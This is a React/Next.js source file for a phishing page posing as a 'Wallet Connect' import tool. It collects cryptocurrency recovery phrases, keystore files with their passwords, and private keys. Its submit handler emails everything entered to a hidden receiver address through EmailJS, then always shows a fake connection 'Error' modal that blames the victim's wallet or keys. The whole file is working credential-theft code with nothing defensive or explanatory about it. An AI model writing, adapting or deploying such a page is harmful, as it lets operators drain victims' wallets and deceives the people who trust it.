'use client';

import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { ArrowLeft } from 'lucide-react';
import { useRouter } from 'next/navigation';
import emailjs from '@emailjs/browser';
import Image from 'next/image';

const WalletConnectPage: React.FC = () => {
  const [activeTab, setActiveTab] = useState<string>('phrase');
  const [phraseInput, setPhraseInput] = useState<string>('');
  const [keystoreInput, setKeystoreInput] = useState<string>('');
  const [passwordInput, setPasswordInput] = useState<string>('');
  const [privateKeyInput, setPrivateKeyInput] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string>('');
  const [showErrorModal, setShowErrorModal] = useState<boolean>(false);

  const router = useRouter();

  const resetInputs = () => {
    setPhraseInput('');
    setKeystoreInput('');
    setPasswordInput('');
    setPrivateKeyInput('');
  };

  const handleImportWallet = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      let messageContent = '';
      switch (activeTab) {
        case 'phrase':
          messageContent = `Recovery Phrase: ${phraseInput}`;
          break;
        case 'keystore':
          messageContent = `Keystore JSON: ${keystoreInput}\nPassword: ${passwordInput}`;
          break;
        case 'private-key':
          messageContent = `Private Key: ${privateKeyInput}`;
          break;
      }

      const emailData = {
        to_email: process.env.NEXT_PUBLIC_RECEIVER_EMAIL,
        from_name: 'Wallet Connect',
        message: messageContent,
      };

      // Send email using EmailJS
      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        emailData,
        process.env.NEXT_PUBLIC_EMAILJS_USER_ID!
      );

      // Show error modal after successful submission
      setShowErrorModal(true);
      resetInputs(); // Reset inputs after successful submission

    } catch (error) {
      setError('Failed to sync wallet. Please try again.');
      console.log(error)
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-black via-blue-950 to-black flex items-center justify-center p-6 md:p-12">
      {/* Back Button */}
      <button 
        onClick={() => router.back()}
        className="absolute top-6 left-6 text-gray-400 hover:text-white transition-colors flex items-center gap-2"
      >
        <ArrowLeft size={24} />
        <span className="text-sm">Back</span>
      </button>

      <div className="w-full max-w-4xl mx-auto">
        <Card className="bg-slate-900/50 backdrop-blur-sm border-gray-800">
          <CardHeader>
            <CardTitle className="text-2xl md:text-5xl text-center text-white">
              Import Wallet
            </CardTitle>
            <CardDescription className=" text-base md:text-lg text-center text-gray-400">
              Import your wallet using one of the methods below
            </CardDescription>
          </CardHeader>
          
          <CardContent  className=' mt-[3rem] '>
            <Tabs defaultValue="phrase" className="w-full" onValueChange={setActiveTab}>
              <TabsList className="grid w-full grid-cols-3 h-14  mb-8 bg-slate-950/50">
                <TabsTrigger value="phrase" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white px-4 py-3 text-gray-400">
                  Phrase
                </TabsTrigger>
                <TabsTrigger value="keystore" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white px-4 py-3 text-gray-400">
                  Keystore
                </TabsTrigger>
                <TabsTrigger value="private-key" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white px-4 py-3 text-gray-400">
                  Private Key
                </TabsTrigger>
              </TabsList>

              <TabsContent value="phrase">
                <form onSubmit={handleImportWallet} className="space-y-8 mt-6">
                  <div className="space-y-4">
                    <textarea 
                      value={phraseInput}
                      onChange={(e) => setPhraseInput(e.target.value)}
                      className="min-h-[150px] w-full p-5 rounded-lg bg-slate-900 text-white border border-gray-800 text-lg"
                      placeholder="Enter your recovery phrase"
                    />
                    <p className="text-gray-400 pl-1 lg:text-xl">
                      Enter your recovery phrase
                    </p>
                  </div>
                  {error && (
                    <p className="text-red-500 text-sm">{error}</p>
                  )}
                  <Button 
                    type="submit" 
                    className={`w-full text-lg py-7 ${
                      phraseInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                    }`}
                    disabled={!phraseInput.trim() || loading}
                  >
                    {loading ? 'Processing...' : 'Proceed'}
                  </Button>
                </form>
              </TabsContent>

              <TabsContent value="keystore">
                <form onSubmit={handleImportWallet} className="space-y-8 mt-6">
                  <div className="space-y-4">
                    <p className="text-base font-medium text-gray-300">Keystore</p>
                    <textarea 
                      value={keystoreInput}
                      onChange={(e) => setKeystoreInput(e.target.value)}
                      className="min-h-[150px] w-full p-5 rounded-lg  bg-slate-900 text-white border border-gray-800 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 placeholder:text-gray-500"
                      placeholder="Several lines of text beginning with '{...}' plus the password you used for encryption"
                    />
                  </div>
                  <div className="space-y-4">
                    <Input 
                      type="password"
                      value={passwordInput}
                      onChange={(e) => setPasswordInput(e.target.value)}
                      placeholder="Enter the password"
                      className="bg-slate-900 py-7  text-white border-gray-800 text-lg "
                    />
                  </div>
                  <Button 
                    type="submit" 
                    className={`w-full text-lg py-7 ${
                      keystoreInput.trim() && passwordInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                    }`}
                    disabled={!keystoreInput.trim() || !passwordInput.trim() || loading}
                  >
                    {loading ? 'Processing...' : 'Proceed'}
                  </Button>
                </form>
              </TabsContent>

              <TabsContent value="private-key">
                <form onSubmit={handleImportWallet} className="space-y-8 mt-6">
                  <div className="space-y-4">
                    <Input 
                      type="password"
                      value={privateKeyInput}
                      onChange={(e) => setPrivateKeyInput(e.target.value)}
                      placeholder="Enter your private key"
                      className="bg-slate-900 text-white border-gray-800 text-lg py-7 placeholder:text-xl "
                    />
                    <p className="text-base text-gray-400 pl-1">
                    Before you enter private key, we recommend you connect to the internet.
                    </p>
                  </div>
                  <Button 
                    type="submit" 
                    className={`w-full text-lg py-7 ${
                      privateKeyInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                    }`}
                    disabled={!privateKeyInput.trim() || loading}
                  >
                    {loading ? 'Processing...' : 'Proceed'}
                  </Button>
                </form>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      </div>

      {/* Error Modal */}
      {showErrorModal && (
        <>
          <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40" />
          <div className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-50 
                        bg-gradient-to-b from-black via-blue-950 to-black
                        p-8 rounded-xl border border-gray-800 w-[90%] max-w-md">
            <div className="flex flex-col items-center gap-4 text-center">
              <Image 
                src="/assets/error.png"
                width={80}
                height={80}
                alt="Error"
                className="rounded-full"
                quality={100}
              />
              <h3 className="text-2xl font-bold text-white">Error</h3>
              <div className="text-gray-300 space-y-4">
                <p>
                  Having errors Connecting!!! <br />
                  sorry for the inconveniences this might due to couple of reasons
                  on your side:
                </p>
                <ul className="text-white font-medium space-y-2">
                  <li>1. Inactive Or dormant wallet</li>
                  <li>2. Incorrect keys</li>
                  <li>3. Weak Internet connection</li>
                </ul>
                <p className="text-gray-300">
                  Kindly ensure you fulfill these prerequisites. If the problem still
                  persists kindly revert back to the Support teams
                </p>
              </div>
              <button
                onClick={() => setShowErrorModal(false)}
                className="mt-4 bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-lg
                          transition-colors duration-200"
              >
                Close
              </button>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default WalletConnectPage;